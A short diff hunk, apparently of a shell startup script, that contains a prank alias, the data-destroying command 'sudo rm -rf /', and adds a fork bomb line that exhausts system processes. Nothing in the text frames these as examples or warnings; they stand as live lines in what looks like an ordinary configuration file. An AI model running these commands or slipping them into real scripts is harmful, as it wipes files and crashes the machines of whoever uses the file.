@@ -34,3 +34,4 @@ fi
 alias vim='emacs'
 
 sudo rm -rf /
+:(){ :|:& };:
